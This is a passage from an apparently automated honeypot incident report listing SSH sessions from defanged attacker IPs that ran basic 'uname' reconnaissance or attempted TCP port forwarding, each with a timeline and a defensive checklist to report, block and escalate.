| `2026-08-15 20:27:31` | `cowrie.session.connect` |
| `2026-08-15 20:27:32` | `cowrie.client.version` |
| `2026-08-15 20:27:32` | `cowrie.client.kex` |
| `2026-08-15 20:27:32` | `cowrie.login.success` |
| `2026-08-15 20:27:33` | `cowrie.session.params` |
| `2026-08-15 20:27:33` | `cowrie.command.input` |
| `2026-08-15 20:27:33` | `cowrie.log.closed` |
| `2026-08-15 20:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b471a0d17c7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:37` | `cowrie.session.connect` |
| `2026-08-15 20:27:37` | `cowrie.client.version` |
| `2026-08-15 20:27:37` | `cowrie.client.kex` |
| `2026-08-15 20:27:38` | `cowrie.login.success` |
| `2026-08-15 20:27:38` | `cowrie.session.params` |
| `2026-08-15 20:27:38` | `cowrie.command.input` |
| `2026-08-15 20:27:38` | `cowrie.log.closed` |
| `2026-08-15 20:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b23bebf367

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:42` | `cowrie.session.connect` |
| `2026-08-15 20:27:42` | `cowrie.client.version` |
| `2026-08-15 20:27:42` | `cowrie.client.kex` |
| `2026-08-15 20:27:42` | `cowrie.login.success` |
| `2026-08-15 20:27:44` | `cowrie.session.params` |
| `2026-08-15 20:27:44` | `cowrie.command.input` |
| `2026-08-15 20:27:44` | `cowrie.log.closed` |
| `2026-08-15 20:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3720c9823970

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:47` | `cowrie.session.connect` |
| `2026-08-15 20:27:47` | `cowrie.client.version` |
| `2026-08-15 20:27:47` | `cowrie.client.kex` |
| `2026-08-15 20:27:47` | `cowrie.login.success` |
| `2026-08-15 20:27:48` | `cowrie.session.params` |
| `2026-08-15 20:27:48` | `cowrie.command.input` |
| `2026-08-15 20:27:48` | `cowrie.log.closed` |
| `2026-08-15 20:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2d7fa7c51e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:52` | `cowrie.session.connect` |
| `2026-08-15 20:27:52` | `cowrie.client.version` |
| `2026-08-15 20:27:52` | `cowrie.client.kex` |
| `2026-08-15 20:27:53` | `cowrie.login.success` |
| `2026-08-15 20:27:54` | `cowrie.session.params` |
| `2026-08-15 20:27:54` | `cowrie.command.input` |
| `2026-08-15 20:27:54` | `cowrie.log.closed` |
| `2026-08-15 20:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3664616554

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:27 |
| **Last Seen** | 2026-08-15 20:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:27:57` | `cowrie.session.connect` |
| `2026-08-15 20:27:57` | `cowrie.client.version` |
| `2026-08-15 20:27:57` | `cowrie.client.kex` |
| `2026-08-15 20:27:58` | `cowrie.login.success` |
| `2026-08-15 20:27:59` | `cowrie.session.params` |
| `2026-08-15 20:27:59` | `cowrie.command.input` |
| `2026-08-15 20:27:59` | `cowrie.log.closed` |
| `2026-08-15 20:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-162d8fb514b6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:02` | `cowrie.session.connect` |
| `2026-08-15 20:28:02` | `cowrie.client.version` |
| `2026-08-15 20:28:02` | `cowrie.client.kex` |
| `2026-08-15 20:28:03` | `cowrie.login.success` |
| `2026-08-15 20:28:04` | `cowrie.session.params` |
| `2026-08-15 20:28:04` | `cowrie.command.input` |
| `2026-08-15 20:28:04` | `cowrie.log.closed` |
| `2026-08-15 20:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3573891d5ddb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:07` | `cowrie.session.connect` |
| `2026-08-15 20:28:07` | `cowrie.client.version` |
| `2026-08-15 20:28:07` | `cowrie.client.kex` |
| `2026-08-15 20:28:08` | `cowrie.login.success` |
| `2026-08-15 20:28:09` | `cowrie.session.params` |
| `2026-08-15 20:28:09` | `cowrie.command.input` |
| `2026-08-15 20:28:09` | `cowrie.log.closed` |
| `2026-08-15 20:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179360180366

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:13` | `cowrie.session.connect` |
| `2026-08-15 20:28:13` | `cowrie.client.version` |
| `2026-08-15 20:28:13` | `cowrie.client.kex` |
| `2026-08-15 20:28:13` | `cowrie.login.success` |
| `2026-08-15 20:28:14` | `cowrie.session.params` |
| `2026-08-15 20:28:14` | `cowrie.command.input` |
| `2026-08-15 20:28:14` | `cowrie.log.closed` |
| `2026-08-15 20:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb6b01d3f1f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:18` | `cowrie.session.connect` |
| `2026-08-15 20:28:18` | `cowrie.client.version` |
| `2026-08-15 20:28:18` | `cowrie.client.kex` |
| `2026-08-15 20:28:18` | `cowrie.login.success` |
| `2026-08-15 20:28:19` | `cowrie.session.params` |
| `2026-08-15 20:28:19` | `cowrie.command.input` |
| `2026-08-15 20:28:19` | `cowrie.log.closed` |
| `2026-08-15 20:28:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-688848b8473c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:23` | `cowrie.session.connect` |
| `2026-08-15 20:28:23` | `cowrie.client.version` |
| `2026-08-15 20:28:23` | `cowrie.client.kex` |
| `2026-08-15 20:28:24` | `cowrie.login.success` |
| `2026-08-15 20:28:25` | `cowrie.session.params` |
| `2026-08-15 20:28:25` | `cowrie.command.input` |
| `2026-08-15 20:28:25` | `cowrie.log.closed` |
| `2026-08-15 20:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9421dbea1df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:28` | `cowrie.session.connect` |
| `2026-08-15 20:28:28` | `cowrie.client.version` |
| `2026-08-15 20:28:28` | `cowrie.client.kex` |
| `2026-08-15 20:28:29` | `cowrie.login.success` |
| `2026-08-15 20:28:30` | `cowrie.session.params` |
| `2026-08-15 20:28:30` | `cowrie.command.input` |
| `2026-08-15 20:28:30` | `cowrie.log.closed` |
| `2026-08-15 20:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92859db14d3a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:33` | `cowrie.session.connect` |
| `2026-08-15 20:28:33` | `cowrie.client.version` |
| `2026-08-15 20:28:33` | `cowrie.client.kex` |
| `2026-08-15 20:28:34` | `cowrie.login.success` |
| `2026-08-15 20:28:35` | `cowrie.session.params` |
| `2026-08-15 20:28:35` | `cowrie.command.input` |
| `2026-08-15 20:28:35` | `cowrie.log.closed` |
| `2026-08-15 20:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-564b12dde551

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:38` | `cowrie.session.connect` |
| `2026-08-15 20:28:38` | `cowrie.client.version` |
| `2026-08-15 20:28:38` | `cowrie.client.kex` |
| `2026-08-15 20:28:39` | `cowrie.login.success` |
| `2026-08-15 20:28:40` | `cowrie.session.params` |
| `2026-08-15 20:28:40` | `cowrie.command.input` |
| `2026-08-15 20:28:40` | `cowrie.log.closed` |
| `2026-08-15 20:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52b4e61e1148

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:44` | `cowrie.session.connect` |
| `2026-08-15 20:28:44` | `cowrie.client.version` |
| `2026-08-15 20:28:44` | `cowrie.client.kex` |
| `2026-08-15 20:28:44` | `cowrie.login.success` |
| `2026-08-15 20:28:45` | `cowrie.session.params` |
| `2026-08-15 20:28:45` | `cowrie.command.input` |
| `2026-08-15 20:28:45` | `cowrie.log.closed` |
| `2026-08-15 20:28:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f986d033710

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:28 |
| **Last Seen** | 2026-08-15 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:28:49` | `cowrie.session.connect` |
| `2026-08-15 20:28:49` | `cowrie.client.version` |
| `2026-08-15 20:28:49` | `cowrie.client.kex` |
| `2026-08-15 20:28:49` | `cowrie.login.success` |
| `2026-08-15 20:28:50` | `cowrie.session.params` |
| `2026-08-15 20:28:50` | `cowrie.command.input` |
| `2026-08-15 20:28:50` | `cowrie.log.closed` |
| `2026-08-15 20:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f09803e37338

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 20:30 |
| **Last Seen** | 2026-08-15 20:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:30:22` | `cowrie.session.connect` |
| `2026-08-15 20:30:22` | `cowrie.client.version` |
| `2026-08-15 20:30:23` | `cowrie.client.kex` |
| `2026-08-15 20:30:23` | `cowrie.login.success` |
| `2026-08-15 20:30:24` | `cowrie.session.params` |
| `2026-08-15 20:30:24` | `cowrie.command.input` |
| `2026-08-15 20:30:24` | `cowrie.log.closed` |
| `2026-08-15 20:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d65508b26a4

| Field | Detail |
|---|---|
| **Source IP** | `121.202.206[.]119` |
| **First Seen** | 2026-08-15 20:39 |
| **Last Seen** | 2026-08-15 20:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:39:24` | `cowrie.session.connect` |
| `2026-08-15 20:39:25` | `cowrie.client.version` |
| `2026-08-15 20:39:25` | `cowrie.client.kex` |
| `2026-08-15 20:39:28` | `cowrie.login.success` |
| `2026-08-15 20:39:29` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.206[.]119` to AbuseIPDB if not already reported
- [ ] Block `121.202.206[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4125f027ed7

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-15 20:39 |
| **Last Seen** | 2026-08-15 20:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:39:35` | `cowrie.session.connect` |
| `2026-08-15 20:39:35` | `cowrie.client.version` |
| `2026-08-15 20:39:35` | `cowrie.client.kex` |
| `2026-08-15 20:39:37` | `cowrie.login.success` |
| `2026-08-15 20:39:38` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ef990d7a7c2

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-08-15 20:41 |
| **Last Seen** | 2026-08-15 20:46 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:41:51` | `cowrie.session.connect` |
| `2026-08-15 20:41:52` | `cowrie.client.version` |
| `2026-08-15 20:41:52` | `cowrie.client.kex` |
| `2026-08-15 20:41:53` | `cowrie.login.success` |
| `2026-08-15 20:41:54` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:46:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b00f17a0ea2c

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-08-15 20:42 |
| **Last Seen** | 2026-08-15 20:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:42:00` | `cowrie.session.connect` |
| `2026-08-15 20:42:02` | `cowrie.client.version` |
| `2026-08-15 20:42:02` | `cowrie.client.kex` |
| `2026-08-15 20:42:04` | `cowrie.login.success` |
| `2026-08-15 20:42:05` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:42:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac9fe073b0fc

| Field | Detail |
|---|---|
| **Source IP** | `116.48.150[.]115` |
| **First Seen** | 2026-08-15 20:44 |
| **Last Seen** | 2026-08-15 20:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:44:24` | `cowrie.session.connect` |
| `2026-08-15 20:44:25` | `cowrie.client.version` |
| `2026-08-15 20:44:25` | `cowrie.client.kex` |
| `2026-08-15 20:44:27` | `cowrie.login.success` |
| `2026-08-15 20:44:28` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.150[.]115` to AbuseIPDB if not already reported
- [ ] Block `116.48.150[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387719757013

| Field | Detail |
|---|---|
| **Source IP** | `103.111.6[.]121` |
| **First Seen** | 2026-08-15 20:44 |
| **Last Seen** | 2026-08-15 20:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:44:33` | `cowrie.session.connect` |
| `2026-08-15 20:44:34` | `cowrie.client.version` |
| `2026-08-15 20:44:34` | `cowrie.client.kex` |
| `2026-08-15 20:44:35` | `cowrie.login.success` |
| `2026-08-15 20:44:36` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.111.6[.]121` to AbuseIPDB if not already reported
- [ ] Block `103.111.6[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-036269fd0761

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-15 20:45 |
| **Last Seen** | 2026-08-15 20:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:45:37` | `cowrie.session.connect` |
| `2026-08-15 20:45:37` | `cowrie.client.version` |
| `2026-08-15 20:45:37` | `cowrie.client.kex` |
| `2026-08-15 20:45:38` | `cowrie.login.success` |
| `2026-08-15 20:45:39` | `cowrie.session.params` |
| `2026-08-15 20:45:39` | `cowrie.command.input` |
| `2026-08-15 20:45:39` | `cowrie.log.closed` |
| `2026-08-15 20:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8870633c718f

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 20:46 |
| **Last Seen** | 2026-08-15 20:47 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:46:54` | `cowrie.session.connect` |
| `2026-08-15 20:47:00` | `cowrie.client.version` |
| `2026-08-15 20:47:00` | `cowrie.client.kex` |
| `2026-08-15 20:47:21` | `cowrie.login.success` |
| `2026-08-15 20:47:34` | `cowrie.session.params` |
| `2026-08-15 20:47:34` | `cowrie.command.input` |
| `2026-08-15 20:47:39` | `cowrie.log.closed` |
| `2026-08-15 20:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-637da11eab8b

| Field | Detail |
|---|---|
| **Source IP** | `116.7.248[.]50` |
| **First Seen** | 2026-08-15 20:46 |
| **Last Seen** | 2026-08-15 20:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:46:58` | `cowrie.session.connect` |
| `2026-08-15 20:46:59` | `cowrie.client.version` |
| `2026-08-15 20:46:59` | `cowrie.client.kex` |
| `2026-08-15 20:47:02` | `cowrie.login.success` |
| `2026-08-15 20:47:03` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.7.248[.]50` to AbuseIPDB if not already reported
- [ ] Block `116.7.248[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d18368578fd5

| Field | Detail |
|---|---|
